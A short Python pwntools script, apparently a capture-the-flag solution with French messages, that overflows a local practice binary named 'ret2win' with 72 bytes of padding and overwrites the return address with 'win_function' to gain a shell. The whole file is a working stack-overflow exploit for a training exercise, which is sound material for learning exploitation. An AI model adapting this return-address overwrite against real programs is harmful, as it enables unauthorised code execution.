from pwn import *

exe = './ret2win'
elf = ELF(exe, checksec=False)

context.log_level = 'critical'

def main():
    print("[*] Construction de l'exploit.")

    win_addr = elf.symbols['win_function']

    padding = b"A" * 72
    payload = padding + p64(win_addr)

    p = process([exe, payload])

    try:
        p.recvuntil(b"SUCCES")
        print("[+] Exploit réussi. Shell ouvert.")

        p.interactive()
    except:
        print("[-] Échec de l'exploitation.")

if __name__ == "__main__":
    main()
